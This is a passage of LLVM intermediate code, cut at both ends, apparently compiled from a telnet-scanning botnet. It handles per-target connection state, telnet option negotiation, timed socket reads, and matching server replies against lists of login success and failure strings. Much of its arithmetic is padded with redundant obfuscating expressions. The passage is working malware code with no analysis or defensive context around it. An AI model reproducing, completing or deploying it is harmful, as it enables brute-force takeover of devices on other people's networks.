  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = xor i64 %37, -1
  %39 = xor i64 %31, -1
  %40 = xor i64 9111052155394004555, -1
  %41 = and i64 %38, 9111052155394004555
  %42 = and i64 %37, %40
  %43 = and i64 %39, 9111052155394004555
  %44 = and i64 %31, %40
  %45 = or i64 %41, %42
  %46 = or i64 %43, %44
  %47 = xor i64 %45, %46
  %48 = or i64 %38, %39
  %49 = xor i64 %48, -1
  %50 = or i64 9111052155394004555, %40
  %51 = and i64 %49, %50
  %52 = or i64 %47, %51
  %53 = or i64 %37, %31
  store i64 %52, i64* %36, align 8
  %54 = load i32, i32* %6, align 4
  %55 = sub i32 0, %54
  %56 = sub i32 0, 1
  %57 = add i32 %55, %56
  %58 = sub i32 0, %57
  %59 = add nsw i32 %54, 1
  %60 = call i32 @select(i32 %58, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %61 = icmp slt i32 %60, 1
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %70

; <label>:63:                                     ; preds = %27
  %64 = load i32, i32* %6, align 4
  %65 = load i8*, i8** %8, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = call i64 @recv(i32 %64, i8* %65, i64 %67, i32 0)
  %69 = trunc i64 %68 to i32
  store i32 %69, i32* %5, align 4
  br label %70

; <label>:70:                                     ; preds = %63, %62
  %71 = load i32, i32* %5, align 4
  ret i32 %71
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 0, 1
  %9 = add i64 %7, %8
  %10 = sub i64 %7, 1
  %11 = trunc i64 %9 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %21, %1
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = call i32 @isspace(i32 %18) #9
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %26

; <label>:21:                                     ; preds = %12
  %22 = load i32, i32* %4, align 4
  %23 = sub i32 0, 1
  %24 = sub i32 %22, %23
  %25 = add nsw i32 %22, 1
  store i32 %24, i32* %4, align 4
  br label %12

; <label>:26:                                     ; preds = %12
  br label %27

; <label>:27:                                     ; preds = %42, %26
  %28 = load i32, i32* %5, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %40

; <label>:31:                                     ; preds = %27
  %32 = load i8*, i8** %2, align 8
  %33 = load i32, i32* %5, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i8, i8* %32, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i32
  %38 = call i32 @isspace(i32 %37) #9
  %39 = icmp ne i32 %38, 0
  br label %40

; <label>:40:                                     ; preds = %31, %27
  %41 = phi i1 [ false, %27 ], [ %39, %31 ]
  br i1 %41, label %42, label %49

; <label>:42:                                     ; preds = %40
  %43 = load i32, i32* %5, align 4
  %44 = sub i32 0, %43
  %45 = sub i32 0, -1
  %46 = add i32 %44, %45
  %47 = sub i32 0, %46
  %48 = add nsw i32 %43, -1
  store i32 %47, i32* %5, align 4
  br label %27

; <label>:49:                                     ; preds = %40
  %50 = load i32, i32* %4, align 4
  store i32 %50, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %70, %49
  %52 = load i32, i32* %3, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp sle i32 %52, %53
  br i1 %54, label %55, label %76

; <label>:55:                                     ; preds = %51
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %56, i64 %58
  %60 = load i8, i8* %59, align 1
  %61 = load i8*, i8** %2, align 8
  %62 = load i32, i32* %3, align 4
  %63 = load i32, i32* %4, align 4
  %64 = sub i32 %62, -1601660548
  %65 = sub i32 %64, %63
  %66 = add i32 %65, -1601660548
  %67 = sub nsw i32 %62, %63
  %68 = sext i32 %66 to i64
  %69 = getelementptr inbounds i8, i8* %61, i64 %68
  store i8 %60, i8* %69, align 1
  br label %70

; <label>:70:                                     ; preds = %55
  %71 = load i32, i32* %3, align 4
  %72 = add i32 %71, 95064168
  %73 = add i32 %72, 1
  %74 = sub i32 %73, 95064168
  %75 = add nsw i32 %71, 1
  store i32 %74, i32* %3, align 4
  br label %51

; <label>:76:                                     ; preds = %51
  %77 = load i8*, i8** %2, align 8
  %78 = load i32, i32* %3, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, -1335286340
  %81 = sub i32 %80, %79
  %82 = add i32 %81, -1335286340
  %83 = sub nsw i32 %78, %79
  %84 = sext i32 %82 to i64
  %85 = getelementptr inbounds i8, i8* %77, i64 %84
  store i8 0, i8* %85, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %329, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %332

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %316

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %332

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %317

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %85, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = sub i32 0, 48
  %78 = add i32 %76, %77
  %79 = sub nsw i32 %76, 48
  %80 = load i32, i32* %7, align 4
  %81 = add i32 %80, -1817459844
  %82 = add i32 %81, %78
  %83 = sub i32 %82, -1817459844
  %84 = add nsw i32 %80, %78
  store i32 %83, i32* %7, align 4
  br label %85

; <label>:85:                                     ; preds = %71
  %86 = load i8*, i8** %5, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %5, align 8
  br label %59

; <label>:88:                                     ; preds = %69
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 115
  br i1 %92, label %93, label %134

; <label>:93:                                     ; preds = %88
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = icmp ule i32 %96, 40
  br i1 %97, label %98, label %108

; <label>:98:                                     ; preds = %93
  %99 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 3
  %100 = load i8*, i8** %99, align 8
  %101 = getelementptr i8, i8* %100, i32 %96
  %102 = bitcast i8* %101 to i32*
  %103 = sub i32 0, %96
  %104 = sub i32 0, 8
  %105 = add i32 %103, %104
  %106 = sub i32 0, %105
  %107 = add i32 %96, 8
  store i32 %106, i32* %95, align 8
  br label %113

; <label>:108:                                    ; preds = %93
  %109 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 2
  %110 = load i8*, i8** %109, align 8
  %111 = bitcast i8* %110 to i32*
  %112 = getelementptr i8, i8* %110, i32 8
  store i8* %112, i8** %109, align 8
  br label %113

; <label>:113:                                    ; preds = %108, %98
  %114 = phi i32* [ %102, %98 ], [ %111, %108 ]
  %115 = load i32, i32* %114, align 4
  %116 = sext i32 %115 to i64
  %117 = inttoptr i64 %116 to i8*
  store i8* %117, i8** %11, align 8
  %118 = load i8**, i8*** %4, align 8
  %119 = load i8*, i8** %11, align 8
  %120 = icmp ne i8* %119, null
  br i1 %120, label %121, label %123

; <label>:121:                                    ; preds = %113
  %122 = load i8*, i8** %11, align 8
  br label %124

; <label>:123:                                    ; preds = %113
  br label %124

; <label>:124:                                    ; preds = %123, %121
  %125 = phi i8* [ %122, %121 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.575, i32 0, i32 0), %123 ]
  %126 = load i32, i32* %7, align 4
  %127 = load i32, i32* %8, align 4
  %128 = call i32 @prints(i8** %118, i8* %125, i32 %126, i32 %127)
  %129 = load i32, i32* %9, align 4
  %130 = sub i32 %129, -652128753
  %131 = add i32 %130, %128
  %132 = add i32 %131, -652128753
  %133 = add nsw i32 %129, %128
  store i32 %132, i32* %9, align 4
  br label %329

; <label>:134:                                    ; preds = %88
  %135 = load i8*, i8** %5, align 8
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 100
  br i1 %138, label %139, label %169

; <label>:139:                                    ; preds = %134
  %140 = load i8**, i8*** %4, align 8
  %141 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %142 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 8
  %144 = icmp ule i32 %143, 40
  br i1 %144, label %145, label %154

; <label>:145:                                    ; preds = %139
  %146 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 3
  %147 = load i8*, i8** %146, align 8
  %148 = getelementptr i8, i8* %147, i32 %143
  %149 = bitcast i8* %148 to i32*
  %150 = add i32 %143, 1982491161
  %151 = add i32 %150, 8
  %152 = sub i32 %151, 1982491161
  %153 = add i32 %143, 8
  store i32 %152, i32* %142, align 8
  br label %159

; <label>:154:                                    ; preds = %139
  %155 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 2
  %156 = load i8*, i8** %155, align 8
  %157 = bitcast i8* %156 to i32*
  %158 = getelementptr i8, i8* %156, i32 8
  store i8* %158, i8** %155, align 8
  br label %159

; <label>:159:                                    ; preds = %154, %145
  %160 = phi i32* [ %149, %145 ], [ %157, %154 ]
  %161 = load i32, i32* %160, align 4
  %162 = load i32, i32* %7, align 4
  %163 = load i32, i32* %8, align 4
  %164 = call i32 @printi(i8** %140, i32 %161, i32 10, i32 1, i32 %162, i32 %163, i32 97)
  %165 = load i32, i32* %9, align 4
  %166 = sub i32 0, %164
  %167 = sub i32 %165, %166
  %168 = add nsw i32 %165, %164
  store i32 %167, i32* %9, align 4
  br label %329

; <label>:169:                                    ; preds = %134
  %170 = load i8*, i8** %5, align 8
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 120
  br i1 %173, label %174, label %204

; <label>:174:                                    ; preds = %169
  %175 = load i8**, i8*** %4, align 8
  %176 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %177 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = icmp ule i32 %178, 40
  br i1 %179, label %180, label %188

; <label>:180:                                    ; preds = %174
  %181 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %176, i32 0, i32 3
  %182 = load i8*, i8** %181, align 8
  %183 = getelementptr i8, i8* %182, i32 %178
  %184 = bitcast i8* %183 to i32*
  %185 = sub i32 0, 8
  %186 = sub i32 %178, %185
  %187 = add i32 %178, 8
  store i32 %186, i32* %177, align 8
  br label %193

; <label>:188:                                    ; preds = %174
  %189 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %176, i32 0, i32 2
  %190 = load i8*, i8** %189, align 8
  %191 = bitcast i8* %190 to i32*
  %192 = getelementptr i8, i8* %190, i32 8
  store i8* %192, i8** %189, align 8
  br label %193

; <label>:193:                                    ; preds = %188, %180
  %194 = phi i32* [ %184, %180 ], [ %191, %188 ]
  %195 = load i32, i32* %194, align 4
  %196 = load i32, i32* %7, align 4
  %197 = load i32, i32* %8, align 4
  %198 = call i32 @printi(i8** %175, i32 %195, i32 16, i32 0, i32 %196, i32 %197, i32 97)
  %199 = load i32, i32* %9, align 4
  %200 = add i32 %199, -2109518351
  %201 = add i32 %200, %198
  %202 = sub i32 %201, -2109518351
  %203 = add nsw i32 %199, %198
  store i32 %202, i32* %9, align 4
  br label %329

; <label>:204:                                    ; preds = %169
  %205 = load i8*, i8** %5, align 8
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 88
  br i1 %208, label %209, label %240

; <label>:209:                                    ; preds = %204
  %210 = load i8**, i8*** %4, align 8
  %211 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %212 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 8
  %214 = icmp ule i32 %213, 40
  br i1 %214, label %215, label %224

; <label>:215:                                    ; preds = %209
  %216 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %211, i32 0, i32 3
  %217 = load i8*, i8** %216, align 8
  %218 = getelementptr i8, i8* %217, i32 %213
  %219 = bitcast i8* %218 to i32*
  %220 = sub i32 %213, 377417021
  %221 = add i32 %220, 8
  %222 = add i32 %221, 377417021
  %223 = add i32 %213, 8
  store i32 %222, i32* %212, align 8
  br label %229

; <label>:224:                                    ; preds = %209
  %225 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %211, i32 0, i32 2
  %226 = load i8*, i8** %225, align 8
  %227 = bitcast i8* %226 to i32*
  %228 = getelementptr i8, i8* %226, i32 8
  store i8* %228, i8** %225, align 8
  br label %229

; <label>:229:                                    ; preds = %224, %215
  %230 = phi i32* [ %219, %215 ], [ %227, %224 ]
  %231 = load i32, i32* %230, align 4
  %232 = load i32, i32* %7, align 4
  %233 = load i32, i32* %8, align 4
  %234 = call i32 @printi(i8** %210, i32 %231, i32 16, i32 0, i32 %232, i32 %233, i32 65)
  %235 = load i32, i32* %9, align 4
